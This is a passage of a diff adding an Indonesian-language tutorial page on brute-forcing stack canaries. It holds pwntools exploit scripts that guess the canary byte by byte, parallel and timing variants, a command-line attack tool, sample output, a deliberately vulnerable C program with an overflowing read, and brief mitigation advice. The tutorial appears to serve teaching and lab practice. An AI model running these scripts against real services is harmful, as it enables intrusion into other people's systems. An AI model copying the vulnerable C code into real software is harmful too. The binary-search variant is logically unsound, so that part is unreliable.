+</span></span><span style="display:flex;"><span>            payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;A&#39;</span> * offset  <span style="color:#0f0"># Isi buffer</span>
+</span></span><span style="display:flex;"><span>            payload += canary        <span style="color:#0f0"># Bytes canary yang sudah diketahui</span>
+</span></span><span style="display:flex;"><span>            payload += bytes([byte_val])  <span style="color:#0f0"># Byte yang sedang di-test</span>
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#0f0"># Kirim payload</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">try</span>:
+</span></span><span style="display:flex;"><span>                conn.send(payload)
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>                <span style="color:#0f0"># Coba baca response</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f00">try</span>:
+</span></span><span style="display:flex;"><span>                    response = conn.recv(timeout=<span style="color:#f60">2</span>)
+</span></span><span style="display:flex;"><span>                    <span style="color:#0f0"># Jika dapat response, byte benar</span>
+</span></span><span style="display:flex;"><span>                    canary += bytes([byte_val])
+</span></span><span style="display:flex;"><span>                    log.success(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Found byte </span><span style="color:#87ceeb">{</span>byte_num<span style="color:#87ceeb">}</span><span style="color:#87ceeb">: 0x</span><span style="color:#87ceeb">{</span>byte_val<span style="color:#87ceeb">:</span><span style="color:#87ceeb">02x</span><span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
+</span></span><span style="display:flex;"><span>                    log.info(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Current canary: 0x</span><span style="color:#87ceeb">{</span>canary.hex()<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
+</span></span><span style="display:flex;"><span>                    found_byte = <span style="color:#f00">True</span>
+</span></span><span style="display:flex;"><span>                    conn.close()
+</span></span><span style="display:flex;"><span>                    <span style="color:#f00">break</span>
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>                <span style="color:#f00">except</span> EOFError:
+</span></span><span style="display:flex;"><span>                    <span style="color:#0f0"># Connection closed - byte salah</span>
+</span></span><span style="display:flex;"><span>                    conn.close()
+</span></span><span style="display:flex;"><span>                    <span style="color:#f00">continue</span>
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">except</span> Exception <span style="color:#f00">as</span> e:
+</span></span><span style="display:flex;"><span>                log.warning(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Error: </span><span style="color:#87ceeb">{</span>e<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
+</span></span><span style="display:flex;"><span>                conn.close()
+</span></span><span style="display:flex;"><span>                <span style="color:#f00">continue</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">if</span> not found_byte:
+</span></span><span style="display:flex;"><span>            log.error(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Failed to find byte </span><span style="color:#87ceeb">{</span>byte_num<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">return</span> <span style="color:#f00">None</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">return</span> canary
+</span></span></code></pre></div><h3 id="phase-3-verification">Phase 3: Verification</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">def</span> <span style="color:#ff0">verify_canary</span>(host, port, offset, canary):
+</span></span><span style="display:flex;"><span>    <span style="color:#0f0"># Test canary yang ditemukan</span>
+</span></span><span style="display:flex;"><span>    conn = remote(host, port)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;A&#39;</span> * offset
+</span></span><span style="display:flex;"><span>    payload += canary
+</span></span><span style="display:flex;"><span>    payload += <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;B&#39;</span> * <span style="color:#f60">12</span>  <span style="color:#0f0"># Padding</span>
+</span></span><span style="display:flex;"><span>    payload += <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;C&#39;</span> * <span style="color:#f60">4</span>   <span style="color:#0f0"># Return address dummy</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    conn.send(payload)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">try</span>:
+</span></span><span style="display:flex;"><span>        response = conn.recv(timeout=<span style="color:#f60">2</span>)
+</span></span><span style="display:flex;"><span>        log.success(<span style="color:#87ceeb">&#34;Canary verified successfully!&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">return</span> <span style="color:#f00">True</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">except</span>:
+</span></span><span style="display:flex;"><span>        log.error(<span style="color:#87ceeb">&#34;Canary verification failed&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">return</span> <span style="color:#f00">False</span>
+</span></span></code></pre></div><h2 id="4-implementasi-robust-dengan-error-handling">4. Implementasi Robust dengan Error Handling</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
+</span></span><span style="display:flex;"><span><span style="color:#f00">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f00">class</span> CanaryBruteforcer:
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">def</span> <span style="color:#ff0">__init__</span>(self, host, port, offset, timeout=<span style="color:#f60">2</span>, max_retries=<span style="color:#f60">3</span>):
+</span></span><span style="display:flex;"><span>        self.host = host
+</span></span><span style="display:flex;"><span>        self.port = port
+</span></span><span style="display:flex;"><span>        self.offset = offset
+</span></span><span style="display:flex;"><span>        self.timeout = timeout
+</span></span><span style="display:flex;"><span>        self.max_retries = max_retries
+</span></span><span style="display:flex;"><span>        self.canary = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">def</span> <span style="color:#ff0">test_byte</span>(self, candidate):
+</span></span><span style="display:flex;"><span>        <span style="color:#87ceeb">&#34;&#34;&#34;Test satu byte candidate&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">for</span> attempt in range(self.max_retries):
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">try</span>:
+</span></span><span style="display:flex;"><span>                conn = remote(self.host, self.port)
+</span></span><span style="display:flex;"><span>                payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;A&#39;</span> * self.offset
+</span></span><span style="display:flex;"><span>                payload += self.canary
+</span></span><span style="display:flex;"><span>                payload += bytes([candidate])
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>                conn.send(payload)
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>                <span style="color:#0f0"># Tunggu response</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f00">try</span>:
+</span></span><span style="display:flex;"><span>                    response = conn.recv(timeout=self.timeout)
+</span></span><span style="display:flex;"><span>                    conn.close()
+</span></span><span style="display:flex;"><span>                    <span style="color:#f00">return</span> <span style="color:#f00">True</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f00">except</span> EOFError:
+</span></span><span style="display:flex;"><span>                    conn.close()
+</span></span><span style="display:flex;"><span>                    <span style="color:#f00">return</span> <span style="color:#f00">False</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f00">except</span> Exception:
+</span></span><span style="display:flex;"><span>                    conn.close()
+</span></span><span style="display:flex;"><span>                    <span style="color:#f00">continue</span>
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">except</span> Exception <span style="color:#f00">as</span> e:
+</span></span><span style="display:flex;"><span>                log.warning(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Connection error: </span><span style="color:#87ceeb">{</span>e<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
+</span></span><span style="display:flex;"><span>                time.sleep(<span style="color:#f60">0.1</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#f00">continue</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">return</span> <span style="color:#f00">False</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">def</span> <span style="color:#ff0">brute_force</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#87ceeb">&#34;&#34;&#34;Main bruteforce routine&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        start_time = time.time()
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">for</span> byte_num in range(<span style="color:#f60">4</span>):
+</span></span><span style="display:flex;"><span>            found = <span style="color:#f00">False</span>
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#0f0"># Progress bar untuk current byte</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">for</span> byte_val in range(<span style="color:#f60">256</span>):
+</span></span><span style="display:flex;"><span>                <span style="color:#f00">if</span> self.test_byte(byte_val):
+</span></span><span style="display:flex;"><span>                    self.canary += bytes([byte_val])
+</span></span><span style="display:flex;"><span>                    elapsed = time.time() - start_time
+</span></span><span style="display:flex;"><span>                    log.success(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Byte </span><span style="color:#87ceeb">{</span>byte_num<span style="color:#87ceeb">}</span><span style="color:#87ceeb">: 0x</span><span style="color:#87ceeb">{</span>byte_val<span style="color:#87ceeb">:</span><span style="color:#87ceeb">02x</span><span style="color:#87ceeb">}</span><span style="color:#87ceeb"> &#34;</span>
+</span></span><span style="display:flex;"><span>                              <span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;(Time: </span><span style="color:#87ceeb">{</span>elapsed<span style="color:#87ceeb">:</span><span style="color:#87ceeb">.2f</span><span style="color:#87ceeb">}</span><span style="color:#87ceeb">s, Canary: 0x</span><span style="color:#87ceeb">{</span>self.canary.hex()<span style="color:#87ceeb">}</span><span style="color:#87ceeb">)&#34;</span>)
+</span></span><span style="display:flex;"><span>                    found = <span style="color:#f00">True</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f00">break</span>
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">if</span> not found:
+</span></span><span style="display:flex;"><span>                log.error(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Failed to find byte </span><span style="color:#87ceeb">{</span>byte_num<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#f00">return</span> <span style="color:#f00">None</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        total_time = time.time() - start_time
+</span></span><span style="display:flex;"><span>        log.success(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Full canary found: 0x</span><span style="color:#87ceeb">{</span>self.canary.hex()<span style="color:#87ceeb">}</span><span style="color:#87ceeb"> in </span><span style="color:#87ceeb">{</span>total_time<span style="color:#87ceeb">:</span><span style="color:#87ceeb">.2f</span><span style="color:#87ceeb">}</span><span style="color:#87ceeb"> seconds&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">return</span> self.canary
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Usage</span>
+</span></span><span style="display:flex;"><span>bruteforcer = CanaryBruteforcer(<span style="color:#87ceeb">&#39;localhost&#39;</span>, <span style="color:#f60">1234</span>, offset=<span style="color:#f60">64</span>)
+</span></span><span style="display:flex;"><span>canary = bruteforcer.brute_force()
+</span></span></code></pre></div><h2 id="5-analisis-kecepatan-dan-optimasi">5. Analisis Kecepatan dan Optimasi</h2>
+<h3 id="time-estimation">Time Estimation:</h3>
+<ul>
+<li><strong>Worst-case</strong>: 4 bytes × 256 attempts × 2 seconds = ~34 menit</li>
+<li><strong>Average-case</strong>: 4 bytes × 128 attempts × 2 seconds = ~17 menit</li>
+<li><strong>Best-case</strong>: 4 bytes × 1 attempt × 2 seconds = ~8 detik</li>
+</ul>
+<h3 id="optimasi-techniques">Optimasi Techniques:</h3>
+<p><strong>1. Parallel Connections:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">from</span> concurrent.futures <span style="color:#f00">import</span> ThreadPoolExecutor, as_completed
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f00">def</span> <span style="color:#ff0">parallel_brute_force</span>(self):
+</span></span><span style="display:flex;"><span>    <span style="color:#87ceeb">&#34;&#34;&#34;Bruteforce dengan parallel connections&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">with</span> ThreadPoolExecutor(max_workers=<span style="color:#f60">10</span>) <span style="color:#f00">as</span> executor:
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">for</span> byte_num in range(<span style="color:#f60">4</span>):
+</span></span><span style="display:flex;"><span>            futures = {}
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#0f0"># Test semua byte values secara parallel</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">for</span> byte_val in range(<span style="color:#f60">256</span>):
+</span></span><span style="display:flex;"><span>                future = executor.submit(self.test_byte, byte_val)
+</span></span><span style="display:flex;"><span>                futures[future] = byte_val
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#0f0"># Process results</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">for</span> future in as_completed(futures):
+</span></span><span style="display:flex;"><span>                byte_val = futures[future]
+</span></span><span style="display:flex;"><span>                <span style="color:#f00">if</span> future.result():
+</span></span><span style="display:flex;"><span>                    self.canary += bytes([byte_val])
+</span></span><span style="display:flex;"><span>                    <span style="color:#f00">break</span>
+</span></span></code></pre></div><p><strong>2. Binary Search Approach</strong> (jika possible):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">def</span> <span style="color:#ff0">binary_search_byte</span>(self, byte_num):
+</span></span><span style="display:flex;"><span>    <span style="color:#87ceeb">&#34;&#34;&#34;Binary search untuk menemukan byte yang benar&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    low = <span style="color:#f60">0</span>
+</span></span><span style="display:flex;"><span>    high = <span style="color:#f60">255</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">while</span> low &lt;= high:
+</span></span><span style="display:flex;"><span>        mid = (low + high) // <span style="color:#f60">2</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">if</span> self.test_byte(mid):
+</span></span><span style="display:flex;"><span>            <span style="color:#0f0"># Jika mid benar, cari yang lebih tinggi</span>
+</span></span><span style="display:flex;"><span>            low = mid + <span style="color:#f60">1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#0f0"># Jika mid salah, cari yang lebih rendah</span>
+</span></span><span style="display:flex;"><span>            high = mid - <span style="color:#f60">1</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">return</span> low - <span style="color:#f60">1</span>  <span style="color:#0f0"># Return last successful byte</span>
+</span></span></code></pre></div><p><strong>3. Adaptive Timeout:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">def</span> <span style="color:#ff0">adaptive_test_byte</span>(self, candidate):
+</span></span><span style="display:flex;"><span>    <span style="color:#87ceeb">&#34;&#34;&#34;Timeout adaptive berdasarkan response time&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    start_time = time.time()
+</span></span><span style="display:flex;"><span>    result = self.test_byte(candidate)
+</span></span><span style="display:flex;"><span>    response_time = time.time() - start_time
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#0f0"># Jika response cepat, kemungkinan besar benar</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">if</span> response_time &lt; <span style="color:#f60">0.5</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">return</span> <span style="color:#f00">True</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">return</span> result
+</span></span></code></pre></div><h2 id="6-real-world-example-dan-debugging">6. Real-world Example dan Debugging</h2>
+<h3 id="contoh-output-bruteforce">Contoh Output Bruteforce:</h3>
+<pre tabindex="0"><code>[+] Starting local process &#39;./vulnerable_server&#39;: pid 1234
+[∗] Bruteforcing canary...
+[+] Byte 0: 0x00 (Time: 2.1s, Canary: 0x00)
+[+] Byte 1: 0xde (Time: 130.5s, Canary: 0x00de)
+[+] Byte 2: 0xad (Time: 258.3s, Canary: 0x00dead)
+[+] Byte 3: 0xbe (Time: 387.1s, Canary: 0x00deadbe)
+[+] Full canary found: 0x00deadbe in 387.1 seconds
+</code></pre><h3 id="debugging-tips">Debugging Tips:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#0f0"># Enable debug logging</span>
+</span></span><span style="display:flex;"><span>context.log_level = <span style="color:#87ceeb">&#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Tambahkan timeout handling</span>
+</span></span><span style="display:flex;"><span>context.timeout = <span style="color:#f60">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Gunakan signal handling untuk connection errors</span>
+</span></span><span style="display:flex;"><span><span style="color:#f00">import</span> signal
+</span></span><span style="display:flex;"><span>signal.signal(signal.SIGALRM, timeout_handler)
+</span></span></code></pre></div><h2 id="7-advanced-techniques">7. Advanced Techniques</h2>
+<h3 id="bypass-canary-dengan-partial-overwrite">Bypass Canary dengan Partial Overwrite:</h3>
+<p>Jika kita sudah tahu beberapa byte canary (melalui info leak), kita bisa mengurangi waktu bruteforce.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">def</span> <span style="color:#ff0">partial_bruteforce</span>(self, known_bytes):
+</span></span><span style="display:flex;"><span>    <span style="color:#87ceeb">&#34;&#34;&#34;Bruteforce hanya bytes yang tidak diketahui&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    self.canary = known_bytes
+</span></span><span style="display:flex;"><span>    remaining_bytes = <span style="color:#f60">4</span> - len(known_bytes)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">for</span> byte_num in range(remaining_bytes):
+</span></span><span style="display:flex;"><span>        <span style="color:#0f0"># ... same as before</span>
+</span></span></code></pre></div><h3 id="heap-spraying-alternative">Heap Spraying Alternative:</h3>
+<p>Untuk beberapa implementasi, canary mungkin diambil dari nilai tertentu yang bisa diprediksi.</p>
+<h3 id="timing-attacks">Timing Attacks:</h3>
+<p>Menggunakan perbedaan waktu response untuk menentukan byte yang benar.</p>
+<h2 id="8-mitigation-dan-countermeasures">8. Mitigation dan Countermeasures</h2>
+<h3 id="cara-mencegah-bruteforce-attack">Cara Mencegah Bruteforce Attack:</h3>
+<ol>
+<li><strong>Canary Randomization</strong>: Generate canary baru setelah fork</li>
+<li><strong>Connection Limits</strong>: Limit koneksi per IP address</li>
+<li><strong>Rate Limiting</strong>: Tambahkan delay antara koneksi</li>
+<li><strong>Canary Protection</strong>: Gunakan canary yang lebih kompleks</li>
+</ol>
+<h3 id="implementasi-secure">Implementasi Secure:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#0f0">// Generate canary setelah fork
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#ee82ee">void</span> <span style="color:#ff0">__attribute__</span>((constructor)) <span style="color:#ff0">generate_canary</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#0f0">// Baca dari /dev/urandom untuk canary yang lebih secure
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    <span style="color:#ee82ee">int</span> fd = <span style="color:#ff0">open</span>(<span style="color:#87ceeb">&#34;/dev/urandom&#34;</span>, O_RDONLY);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">read</span>(fd, &amp;global_canary, <span style="color:#f00">sizeof</span>(global_canary));
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">close</span>(fd);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="9-tools-dan-automation">9. Tools dan Automation</h2>
+<h3 id="automated-bruteforce-script">Automated Bruteforce Script:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#0f0">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f00">import</span> argparse
+</span></span><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f00">def</span> <span style="color:#ff0">main</span>():
+</span></span><span style="display:flex;"><span>    parser = argparse.ArgumentParser(description=<span style="color:#87ceeb">&#39;Canary bruteforce tool&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser.add_argument(<span style="color:#87ceeb">&#39;host&#39;</span>, help=<span style="color:#87ceeb">&#39;Target host&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser.add_argument(<span style="color:#87ceeb">&#39;port&#39;</span>, type=int, help=<span style="color:#87ceeb">&#39;Target port&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser.add_argument(<span style="color:#87ceeb">&#39;offset&#39;</span>, type=int, help=<span style="color:#87ceeb">&#39;Offset to canary&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser.add_argument(<span style="color:#87ceeb">&#39;--timeout&#39;</span>, type=float, default=<span style="color:#f60">2</span>, help=<span style="color:#87ceeb">&#39;Timeout per attempt&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser.add_argument(<span style="color:#87ceeb">&#39;--workers&#39;</span>, type=int, default=<span style="color:#f60">1</span>, help=<span style="color:#87ceeb">&#39;Number of parallel workers&#39;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    args = parser.parse_args()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    bruteforcer = CanaryBruteforcer(
+</span></span><span style="display:flex;"><span>        args.host, 
+</span></span><span style="display:flex;"><span>        args.port, 
+</span></span><span style="display:flex;"><span>        args.offset,
+</span></span><span style="display:flex;"><span>        timeout=args.timeout
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    canary = bruteforcer.brute_force()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">if</span> canary:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Success! Canary: 0x</span><span style="color:#87ceeb">{</span>canary.hex()<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#87ceeb">&#34;Bruteforce failed&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f00">if</span> <span style="color:#eedd82">__name__</span> == <span style="color:#87ceeb">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><h3 id="c-partial-overwrite-jika-ada-info-leak">C. Partial Overwrite (Jika Ada Info Leak)</h3>
+<h3 id="mengapa-partial-overwrite-mungkin">Mengapa Partial Overwrite Mungkin?</h3>
+<p>Ketika program memiliki vulnerability information leak (seperti format string bug), penyerang dapat:</p>
+<ol>
+<li>Membaca nilai canary dari memory</li>
+<li>Merekonstruksi canary yang valid</li>
+<li>Membuat payload yang mempertahankan canary asli</li>
+<li>Meng-overwrite hanya bagian setelah canary</li>
+</ol>
+<h3 id="alur-eksploitasi">Alur Eksploitasi</h3>
+<ol>
+<li><strong>Leak Information</strong>: Dapatkan alamat buffer atau nilai canary</li>
+<li><strong>Reconstruct Canary</strong>: Gunakan informasi yang dibocorkan</li>
+<li><strong>Craft Payload</strong>: Buat payload yang mempertahankan canary valid</li>
+<li><strong>Hijack Control Flow</strong>: Overwrite return address atau fungsi pointer</li>
+</ol>
+<h3 id="tantangan-dalam-partial-overwrite">Tantangan dalam Partial Overwrite</h3>
+<ul>
+<li>Canary yang randomized membutuhkan leak untuk setiap eksekusi</li>
+<li>Format string exploitation membutuhkan pemahaman layout stack</li>
+<li>Ukuran buffer yang terbatas mempersulit payload complex</li>
+</ul>
+<h2 id="analisis-program-vulnerable">Analisis Program Vulnerable</h2>
+<h3 id="kode-sumber-vulnerable">Kode Sumber Vulnerable</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdio.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;unistd.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ee82ee">void</span> <span style="color:#ff0">vulnerable</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ee82ee">char</span> buffer[<span style="color:#f60">40</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;Buffer is at %p</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>, buffer);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">read</span>(<span style="color:#f60">0</span>, buffer, <span style="color:#f60">100</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;Hello, %s</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>, buffer);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ee82ee">int</span> <span style="color:#ff0">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">vulnerable</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">return</span> <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="kompilasi-dengan-proteksi">Kompilasi dengan Proteksi</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -m32 -fstack-protector vuln.c -o vuln
+</span></span></code></pre></div><h3 id="analisis-assembly-mendalam">Analisis Assembly Mendalam</h3>
+<p>Dengan menggunakan <code>objdump -d -M intel vuln</code>, kita dapat menganalisis fungsi <code>vulnerable</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span>080484<span style="color:#f00">db</span> &lt;<span style="color:#eedd82">vulnerable</span>&gt;:
+</span></span><span style="display:flex;"><span> 80484db:       55                      <span style="color:#ff0">push</span>   ebp
+</span></span><span style="display:flex;"><span> 80484dc:       89 <span style="color:#ff0">e5</span>                   <span style="color:#eedd82">mov</span>    ebp,esp
+</span></span><span style="display:flex;"><span> 80484de:       83 <span style="color:#ff0">ec</span> <span style="color:#f60">38</span>                <span style="color:#eedd82">sub</span>    esp,<span style="color:#f60">0x38</span>        <span style="color:#0f0">; Alokasi 56 byte di stack</span>
